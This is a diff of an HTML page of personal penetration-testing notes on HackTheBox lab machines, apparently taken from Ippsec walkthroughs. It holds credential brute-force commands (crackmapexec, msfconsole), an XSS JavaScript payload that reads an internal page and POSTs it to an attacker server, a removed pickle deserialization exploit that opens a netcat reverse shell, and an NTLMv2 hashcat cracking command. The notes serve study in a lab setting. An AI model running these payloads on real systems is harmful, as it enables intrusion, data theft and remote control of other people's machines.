@@ -1714,33 +1714,81 @@ to 127.0.0.1 and in burpsuite under Tools > proxy he added 127.0.0.1:8081 in the
     </code></pre>
 </div>
 
+<div class="github-dark">
+    <pre><code>
+-------------------[Ippsec heist htb]------------------------------
+when ippsec wanted to know the hashcat mode he run:
+./hashcat --example-hashes | grep -B2 '\$1\$'
+
+he took the found users and the cracked passwords into individual files and then run crackmapexec which will try every combination for you:
+crackmapexec -u users.txt -p passwords.txt --shares [IP]
+
+the same thing as msfconsole:
+msfconsole -q -x "use auxiliary/scanner/smb/smb_login; setg USER_FILE users.txt; setg PASS_FILE passwords.txt; setg RHOSTS 10.10.10.149; run; "
+
+or
+
+msfconsole -q -x "use auxiliary/scanner/winrm/winrm_login; setg USER_FILE users.txt; setg PASS_FILE passwords.txt; setg RHOSTS 10.10.10.149; run; "
+
+
+after he found a valid username password he run rid/sid bruteforce to get more users:
+python3 lookupsid.py'user:pass'@ip
+
+manually what this tool does is like running with the known user cred:
+rpcclient -I 'user%pass' ip 
+
+then doing lookupsids [sid]
+to get the username that belong to that sid in the machine
+
+crackmapexec only says (Pwn3d!) when you have psexec 
+
+when ippsec entered the machine as the cracked user he dumped firefox process and stringsed it to get the password then he checked with the winrm msf 
+module to check if that pass belong to any user which was admin, he downloaded sysinternal tools using :
+procdump64.exe -ma [pid]
+
+
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
 
 
 <div class="github-dark">
     <pre><code>
 -------------------[XSS]------------------------------
+Ippsec stacked - xss can enable you to be like SSRF where you can load some  internal page and send the respond  to your python server, all this if you have xss that makes the web download JavaScripts from you and your JavaScript does this naughty stuff for you and also it would help if you know the specific internal page this is also called CSRF :)
+
+Referer - where they launched this from
+
+this is the code
+var target = "http://mail.stacked.htb/";
+var req1 = new XMLHttpRequest();
+req1.open('GET', target, false);
+req1.send();
+
+var response = req1.responseText;
+
+var req2 = new XMLHttpRequest();
+req2.open('POST', "http://10.10.14.8:8000/", false);
+req2.send(response);
+
+however, CORS can ruin this if the internal resource you want to access is not in the origin the server sends in its headers in every http request, because when the internal resource domain recieves the request from the domain you are impersonating and sending your request on behalf, the internal resource will check the http header and see that the  origin is not in its range and will return error in the console.
+
 xss - enables you to steal the cookie and access as admin
 
-appended/hidden xss = search for any input that get appended into the html specially into a tags you have to always ask your self when there is input, WHERE MY INPUT GOES ? and inspect the source code
-converted into html = search for a place where you can input html tags
-xss parameter = search for vulnerable parameter
+- appended/hidden xss = search for any input that get appended into the html specially into a tags you have to always ask your self when there is input, WHERE MY INPUT GOES ? and inspect the source code
+- converted into html = search for a place where you can input html tags
+- xss parameter = search for vulnerable parameter
+- some parameters are stored in a html tag parameters
 ------------------------------------------------------------------------------------------------------------
 
 
     </code></pre>
 </div>
 
-<div class="github-dark">
-    <pre><code>
--------------------[smb relay]--------------------------------
-what i understrand from the smb relay attack is that, normally there is a file share server and clients, the client once will typo the share name he will not get it so he will start asking who has this share ?? using LLMNR or NBT-NS as a resolution discovery without the need of DNS so here we come and say yes i have this share, the client will believe us we will ask them to authenticate etc we will make him do the normal process here while we will forward it to the main server i was questioning that since the share name from the beginning is wrong it means we won't authenticate anyway even if we are MITM, but what i understood is that the authentication process by itself is enough for us to list the shares in the sharing server so eventhough we will get rejected but we will be authenticated ! which is what we want to list the shares and the "share doesn't exists error we will send it to the client" so next time you typo the share name you should pull your hair out because you won't feel it while there might be an attacker who forwarded the "share does't exist error for you :) and that is why mitigating it by disabling LLMNR and NBT-NS which will make the client not ask 'who has this share' thus the attacker can't know if there is any client missing to find a share or vlan client isolation to lower the possibility of someone sniffing on clients asking of typo shares 
-
-if you got the NTLMv2 hash crack it baby hashcat -m 5600 hash.txt password_List.txt -o cracked.txt
-------------------------------------------------------------------------------------------------------------
 
 
-    </code></pre>
-</div>
 
 <div class="github-dark">
     <pre><code>
@@ -1950,24 +1998,69 @@ then create the filelist.txt with the following paths:
 
 <div class="github-dark">
     <pre><code>
--------------------[ippsec pickle unserialization exploit - DevOps htb]--------------------------------
-import pickle
-from base64 import urlsafe_b64encode as b64encode
+-------------------[Ippsec stacked ]--------------------------------
 
-RUNME = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 9001 &gt;/tmp/f"""
+Ippsec stacked - (xss to ssrf) xss can enable you to be like SSRF where you can load some  internal page and send the respond  to your python server, all this if you have xss that makes the web download JavaScripts from you and your JavaScript does this naughty stuff for you and also it would help if you know the specific internal page this is also called CSRF :)
 
-class PleaseSubscribe(object):
-    def __reduce__(self):
-        import os
-        return (os.system, (RUNME,))
+But you need to be lucky that the other internal site in the same origin, or the origin header is not configured or you bypass the CORS ...------------------------------------------------------------------------------------------------------------
 
-print(b64encode(pickle.dumps(PleaseSubscribe())))
+
+    </code></pre>
+</div>
+
+<div class="github-dark">
+    <pre><code>
+-------------------[Ippsec stacked ]--------------------------------
+Ippsec  htb editorial -
+ SSRF  enables you to discover IPv6 of the machine to nmap it and get more services because sometimes you will be lucky and firewall will only be configured ipv4 so scanning IPv6 will reveal more ports
+ ...------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+
+
+<div class="github-dark">
+    <pre><code>
+-------------------[Ippsec htb editorial]--------------------------------
+
+ SSRF  enables you to discover IPv6 of the machine to nmap it and get more services because sometimes you will be lucky and firewall will only be configured ipv4 so scanning IPv6 will reveal more ports,
+ 
 ------------------------------------------------------------------------------------------------------------
 
 
     </code></pre>
 </div>
 
+
+
+<div class="github-dark">
+    <pre><code>
+-------------------[Ippsec stacked ]--------------------------------
+Ippsec stacked - xss can enable you to be like SSRF where you can load some  internal page and send the respond  to your python server, all this if you have xss that makes the web download JavaScripts from you and your JavaScript does this naughty stuff for you and also it would help if you know the specific internal page this is also called CSRF :)
+
+But you need to be lucky that the other internal site in the same origin, or the origin header is not configured or you bypass the CORS ...
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
+
+
+<h2 id="description"><a href="#description">Changed my understanding</a></h2>
+
+<div class="github-dark">
+    <pre><code>
+-------------------[smb relay]--------------------------------
+what i understrand from the smb relay attack is that, normally there is a file share server and clients, the client once will typo the share name he will not get it so he will start asking who has this share ?? using LLMNR or NBT-NS as a resolution discovery without the need of DNS so here we come and say yes i have this share, the client will believe us we will ask them to authenticate etc we will make him do the normal process here while we will forward it to the main server i was questioning that since the share name from the beginning is wrong it means we won't authenticate anyway even if we are MITM, but what i understood is that the authentication process by itself is enough for us to list the shares in the sharing server so eventhough we will get rejected but we will be authenticated ! which is what we want to list the shares and the "share doesn't exists error we will send it to the client" so next time you typo the share name you should pull your hair out because you won't feel it while there might be an attacker who forwarded the "share does't exist error for you :) and that is why mitigating it by disabling LLMNR and NBT-NS which will make the client not ask 'who has this share' thus the attacker can't know if there is any client missing to find a share or vlan client isolation to lower the possibility of someone sniffing on clients asking of typo shares 
+
+if you got the NTLMv2 hash crack it baby hashcat -m 5600 hash.txt password_List.txt -o cracked.txt
+------------------------------------------------------------------------------------------------------------
+
+
+    </code></pre>
+</div>
 
 <style>.github-dark{color:#e1e4e8;background:#24292e;}.ct-806137{color:#B392F0;}.ct-767297{color:#E1E4E8;}.ct-244866{color:#9ECBFF;}.ct-533739{color:#79B8FF;}.ct-326375{color:#6A737D;}.ct-857441{color:#F97583;}.ct-211346{color:#85E89D;}.ct-657843{color:#FFAB70;}</style></div></article></div><div class="bug-container" data-v-3d677fb4=""><svg id="bug-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="-500 -500 1000 1000" shape-rendering="geometricPrecision" text-rendering="geometricPrecision"><g id="centeredGroup"><g><g id="bug" transform="scale(0.3)" class="no-anim"><g transform="matrix(0 1 1 0 -181 -190)"><g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><path d="M272.925,109.032c0,0,2.559-23.035,20.345-41.841c17.786-18.805,30.24-26.227,38.841-28.59c1.337-.367,6.54,0,8.501,3.634c1.96,3.634,0,8.784-2.694,10.238-8.867,4.783-26.383,16.413-33.997,26.707-8.238,11.14-17.851,29.476-17.051,37.977l-13.945-8.125Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path><g transform="matrix(-1 0 0 1 508.385 0)" clip-rule="evenodd"><path d="M272.925,109.032c0,0,2.559-23.035,20.345-41.841c17.786-18.805,30.24-26.227,38.841-28.59c1.337-.367,6.54,0,8.501,3.634c1.96,3.634,0,8.784-2.694,10.238-8.867,4.783-26.383,16.413-33.997,26.707-8.238,11.14-17.851,29.476-17.051,37.977l-13.945-8.125Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><path d="M254.526,97.911c-35.103,18.394-69.049,34.232-69.049,86.61h138.098c0-52.378-33.945-68.216-69.049-86.61Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-1 0 0 1 435.535-38.4886)" clip-rule="evenodd"><path d="M220.774,403.471c-62.815-37.555-58.198-88.343-58.198-88.343v-115.076h183.9v115.076c0,0,4.617,50.788-58.198,88.343l-.269-1.022v-58.76l20.108-16.434v-32.545c7.793-2.587,13.421-9.94,13.421-18.598c0-10.814-8.779-19.592-19.592-19.592s-19.592,8.778-19.592,19.592c0,8.847,5.877,16.332,13.937,18.762v27.052l-19.775,17.268v70.735c-5.044,2.543-10.45,5-16.243,7.348v-87.247c8.012-2.459,13.845-9.921,13.845-18.735c0-10.813-8.779-19.592-19.592-19.592s-19.592,8.779-19.592,19.592c0,8.814,5.833,16.276,13.846,18.735v87.247l-.158-.064c-2.771-1.127-5.522-2.304-8.247-3.538-2.593-1.174-5.161-2.401-7.704-3.679l-.135-.067v-63.735l-19.775-14.268v-20.792c7.541-2.726,12.937-9.953,12.937-18.431c0-10.813-8.779-19.591-19.592-19.591s-19.592,8.778-19.592,19.591c0,8.658,5.628,16.012,13.421,18.599v25.953l21.109,14.434v50.76l-.27,1.022Zm33.752-101.852c5.341,0,9.676,4.336,9.676,9.676c0,5.341-4.335,9.677-9.676,9.677-5.34,0-9.676-4.336-9.676-9.677c0-5.34,4.336-9.676,9.676-9.676Zm-48.42-18.592c5.34,0,9.676,4.336,9.676,9.676c0,5.341-4.336,9.677-9.676,9.677-5.341,0-9.676-4.336-9.676-9.677c0-5.34,4.335-9.676,9.676-9.676Zm95.84-16.592c5.341,0,9.677,4.336,9.677,9.677c0,5.34-4.336,9.676-9.677,9.676-5.34,0-9.676-4.336-9.676-9.676c0-5.341,4.336-9.677,9.676-9.677Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(-.909773 0 0 1 493.319 0)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.794-1.612-1.772-1.612h-28.799c-5.068,0-9.183,3.744-9.183,8.354c0,4.611,4.115,8.354,9.183,8.354h28.799c.978,0,1.772-.722,1.772-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-.866025-.5-.5 0.866025 609.497791 100.975794)" clip-rule="evenodd"><g id="evygBKlPSqr13_tr" transform="translate(139.737,232.188) rotate(0)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(-1 0 0 1 508.385 41.2501)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-.707107 0.707107 0.707107 0.707107 310.015271 10.447407)" clip-rule="evenodd"><g id="evygBKlPSqr18_tr" transform="translate(139.737,232.188) rotate(0)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(-1 0 0 1 508.385 92.3776)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(0 1.06393 1 0 140.199 180.854)" clip-rule="evenodd"><path d="M166.979,232.188c0-4.61-3.519-8.354-7.852-8.354h-24.05c-4.334,0-7.852,3.744-7.852,8.354c0,4.611,3.518,8.354,7.852,8.354h24.05c4.333,0,7.852-3.743,7.852-8.354Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-.866025-.5-.5 0.866025 609.497658 221.785295)" clip-rule="evenodd"><g id="evygBKlPSqr25_tr" transform="translate(139.73775,232.188433) rotate(0)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.73775,-232.188433)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(.909773 0 0 1 15.066 0)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.794-1.612-1.772-1.612h-28.799c-5.068,0-9.183,3.744-9.183,8.354c0,4.611,4.115,8.354,9.183,8.354h28.799c.978,0,1.772-.722,1.772-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="translate(-3.73987 0)" clip-rule="evenodd"><g id="evygBKlPSqr30_tr" transform="translate(139.737,232.188) rotate(45)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="translate(0 41.2501)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(.866025-.5 0.5 0.866025-104.112656 142.225892)" clip-rule="evenodd"><g id="evygBKlPSqr35_tr" transform="translate(139.737,232.188) rotate(0)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="translate(0 92.3776)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(0 1.06393-1 0 368.186 180.854)" clip-rule="evenodd"><path d="M166.979,232.188c0-4.61-3.519-8.354-7.852-8.354h-24.05c-4.334,0-7.852,3.744-7.852,8.354c0,4.611,3.518,8.354,7.852,8.354h24.05c4.333,0,7.852-3.743,7.852-8.354Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="translate(-3.73987 120.809)" clip-rule="evenodd"><g id="evygBKlPSqr42_tr" transform="translate(139.737,232.188) rotate(30)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.736996,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g></g><rect id="bug-rect" x="0" width="362" height="380"></rect></g></g><animateMotion dur="30s" repeatCount="indefinite" rotate="auto-reverse" path="M -500 -500 M 500 -500 M -500 500 M 638 646 C 244 99 294 251 237 -148 C 229 -325 -43 -261 -138 -205 C -455 -57 -374 404 64 339 C 355 327 290 -273 -109 -143 C -336 -66 -356 16 -378 106 C -413 252 -319 649 -5 451 C 293 243 -326 155 -145 -36 C -45 -124 431 60 144 222 C -149 368 -258 13 17 -110 C 325 -218 203 200 34 181 C -419 161 37 637 635 649"></animateMotion></g></g></svg></div><!--]--></div></div><div class="cli-container" data-v-3d677fb4="" data-v-159c5976=""><div class="cli-output glow-border" data-v-159c5976="" data-v-3fc3914e=""><button class="close-output-btn glow-border" data-v-3fc3914e=""><img src="N-less%20RSA%20TheStray%CF%80rate_files/close_output.svg" alt="v" data-v-3fc3914e=""></button><div class="output-content hide-content" data-v-3fc3914e=""><span data-v-3fc3914e="">/writeups/ $ </span></div></div><div class="cli-prompt glow-border" data-v-159c5976=""><p data-v-159c5976="">
                 <span style="color: indianred;">root@</span>
